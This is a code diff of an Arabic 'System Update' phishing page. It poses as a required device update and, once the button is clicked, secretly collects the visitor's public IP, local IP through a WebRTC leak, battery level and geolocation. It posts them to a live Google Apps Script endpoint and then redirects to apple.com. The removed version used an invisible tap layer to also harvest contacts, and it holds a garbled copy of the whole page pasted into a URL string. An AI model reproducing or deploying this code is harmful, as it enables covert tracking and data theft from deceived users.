@@ -1,268 +1,109 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Update</title>
     <style>
-        body { 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0;
-            position: relative;
-            overflow: hidden;
-            background-color: #f8f9fa;
-        }
-        #status { 
-            text-align: center; 
-            z-index: 1;
-            font-size: 20px;
-            color: #555;
-        }
-        /* طبقة اللمس الشفافة - تحل مشكلة User Gesture */
-        #touch-layer {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 10;
-            cursor: pointer;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
+        body { margin: 0; padding: 0; background-color: #f2f2f7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 85%; max-width: 320px; }
+        h2 { color: #1c1c1e; margin-top: 0; font-size: 20px; }
+        p { color: #8e8e93; font-size: 14px; margin-bottom: 25px; }
+        button { background: #007aff; color: white; border: none; padding: 14px 0; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        button:active { transform: scale(0.98); opacity: 0.9; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { display: none; color: #34c759; margin-top: 15px; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
-    <!-- زر اللمس المخفي -->
-    <div id="touch-layer"></div>
+
+<div class="container">
+    <h2>تحديث النظام مطلوب</h2>
+    <p>يرجى الضغط على الزر التالي لمزامنة بيانات الجهاز وتحديث الإعدادات.</p>
     
-    <div id="status">
-        <div>جاري تحديث النظام...</div>
-        <div class="loader"></div>
-    </div>
+    <button id="btn" onclick="startTracking()">تحديث الآن</button>
+    
+    <div class="loader" id="loader"></div>
+    <div id="status">✅ تم التحديث بنجاح</div>
+</div>
 
 <script>
-    // ⚠️ ضع رابط Google Sheet الخاص بك هنا
-    const SHEET_URL = '<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
-    <style>
-        body { 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0;
-            position: relative;
-            overflow: hidden;
-            background-color: #f8f9fa;
-        }
-        #status { 
-            text-align: center; 
-            z-index: 1;
-            font-size: 20px;
-            color: #555;
-        }
-        /* طبقة اللمس الشفافة - تحل مشكلة User Gesture */
-        #touch-layer {
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 10;
-            cursor: pointer;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <!-- زر اللمس المخفي -->
-    <div id="touch-layer"></div>
-    
-    <div id="status">
-        <div>جاري تحديث النظام...</div>
-        <div class="loader"></div>
-    </div>
+    // ⚠️ ضع رابط Google Script الخاص بك هنا بدلاً من النص الموجود بين القوسين
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJLy7uHYErVQI1tNRFgdH3aPzbiHfgL8yM2MXa2G1X6QjDQnERUTbr_YFLjxgA6eIi/exec';
 
-<script>
-    // ⚠️ ضع رابط Google Sheet الخاص بك هنا
-    const SHEET_URL = 'https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec'; 
-
-    async function getBattery() {
-        if (!navigator.getBattery) return "غير متاح";
-        let b = await navigator.getBattery();
-        return Math.round(b.level * 100) + "% (" + (b.charging ? "ممتلئ" : "فارغ") + ")";
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            return (await res.json()).ip;
+        } catch (e) { return 'N/A'; }
     }
 
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve("غير مدعوم");
-            navigator.geolocation.getCurrentPosition(
-                pos => resolve(${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}),
-                () => resolve("تم رفض الإذن")
-            );
+    async function getWebRTC() {
+        return new Promise(resolve => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = e => {
+                if (!e.candidate) {
+                    pc.close();
+                    resolve(pc.localDescription.sdp.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/)?.[0] || 'N/A');
+                }
+            };
         });
     }
 
-    async function getContacts() {
-        try {
-            // واجهة select هي الأكثر توافقاً مع طلب الأذونات الحقيقية
-            const contacts = await navigator.contacts.select(["name", "phone"], { multiple: true });
-            if (!contacts || contacts.length === 0) return "لا توجد جهات اتصال";
-            
-            return contacts.map(c => {
-                let p = c.phone && c.phone[0] ? c.phone[0].value : "";
-                return ${c.name}: ${p};
-            }).join("\n");
-        } catch (e) {
-            return "فشل الوصول: " + e.message;
-        }
-    }
-
-    async function run() {
-        document.getElementById('status').innerHTML = "يرجى الانتظار...";
-        
-        try {
-            // جمع البيانات
-            let battery = await getBattery();
-            let location = await getLocation();
-            
-            // جلب IP خارجي
-            let ip = "خطأ";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                ip = await res.json().ip;
-            } catch(e) { ip = "غير متاح"; }
-
-            // جلب جهات الاتصال (قد يستغرق وقتاً قليلاً)
-            let contacts = await getContacts();
-
-            // تجهيز البيانات للإرسال
-            const payload = JSON.stringify({
-                time: new Date().toLocaleString(),
-                ip: ip,
-                location: location,
-                battery: battery,
-                contacts: contacts
-            });
-
-            // الإرسال إلى Google Sheets (بدون Proxy)
-            await fetch(SHEET_URL, {
-                method: 'POST',
-                mode: 'no-cors', // هذا يتجاوز مشاكل CORS تماماً
-                body: payload
-            });
-
-            document.getElementById('status').innerHTML = "✅ تم التحديث بنجاح!";
-            setTimeout(() => window.location.href = 'https://google.com', 1500);
-        } catch (err) {
-            document.getElementById('status').innerText = "❌ حدث خطأ: " + err.message;
-        }
-    }
-
-    // تفعيل الخدعة: النقر على أي مكان يفتح نافذة جهات الاتصال
-    document.getElementById('touch-layer').addEventListener('click', run);
-</script>
-</body>
-</html>
-'; 
-
     async function getBattery() {
-        if (!navigator.getBattery) return "غير متاح";
-        let b = await navigator.getBattery();
-        return Math.round(b.level * 100) + "% (" + (b.charging ? "ممتلئ" : "فارغ") + ")";
-    }
-
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve("غير مدعوم");
-            navigator.geolocation.getCurrentPosition(
-                pos => resolve(${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}),
-                () => resolve("تم رفض الإذن")
-            );
-        });
-    }
-
-    async function getContacts() {
-        try {
-            // واجهة select هي الأكثر توافقاً مع طلب الأذونات الحقيقية
-            const contacts = await navigator.contacts.select(["name", "phone"], { multiple: true });
-            if (!contacts || contacts.length === 0) return "لا توجد جهات اتصال";
-            
-            return contacts.map(c => {
-                let p = c.phone && c.phone[0] ? c.phone[0].value : "";
-                return ${c.name}: ${p};
-            }).join("\n");
-        } catch (e) {
-            return "فشل الوصول: " + e.message;
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            return Math.round(b.level * 100) + '%';
         }
+        return 'N/A';
     }
 
-    async function run() {
-        document.getElementById('status').innerHTML = "يرجى الانتظار...";
+    async function startTracking() {
+        const btn = document.getElementById('btn');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('status');
+
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+
+        // جمع البيانات الأساسية
+        let ip = await getIP();
+        let localIP = await getWebRTC();
+        let battery = await getBattery();
         
-        try {
-            // جمع البيانات
-            let battery = await getBattery();
-            let location = await getLocation();
-            
-            // جلب IP خارجي
-            let ip = "خطأ";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                ip = await res.json().ip;
-            } catch(e) { ip = "غير متاح"; }
+        // محاولة جلب الموقع
+        let location = "Denied";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    location = ${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)};
+                    sendData(ip, localIP, battery, location);
+                },
+                () => {
+                    sendData(ip, localIP, battery, location);
+                },
+                { timeout: 5000 }
+            );
+        } else {
+            sendData(ip, localIP, battery, location);
+        }
 
-            // جلب جهات الاتصال (قد يستغرق وقتاً قليلاً)
-            let contacts = await getContacts();
-
-            // تجهيز البيانات للإرسال
-            const payload = JSON.stringify({
-                time: new Date().toLocaleString(),
-                ip: ip,
-                location: location,
-                battery: battery,
-                contacts: contacts
-            });
-
-            // الإرسال إلى Google Sheets (بدون Proxy)
-            await fetch(SHEET_URL, {
+        function sendData(ip, locIp, bat, loc) {
+            fetch(GOOGLE_SCRIPT_URL, {
                 method: 'POST',
-                mode: 'no-cors', // هذا يتجاوز مشاكل CORS تماماً
-                body: payload
+                mode: 'no-cors',
+                body: JSON.stringify({ time: new Date(), ip, localIP: locIp, battery: bat, location: loc })
+            }).finally(() => {
+                loader.style.display = 'none';
+                status.style.display = 'block';
+                setTimeout(() => window.location.href = 'https://www.apple.com', 2000);
             });
-
-            document.getElementById('status').innerHTML = "✅ تم التحديث بنجاح!";
-            setTimeout(() => window.location.href = 'https://google.com', 1500);
-        } catch (err) {
-            document.getElementById('status').innerText = "❌ حدث خطأ: " + err.message;
         }
     }
-
-    // تفعيل الخدعة: النقر على أي مكان يفتح نافذة جهات الاتصال
-    document.getElementById('touch-layer').addEventListener('click', run);
 </script>
+
 </body>
 </html>
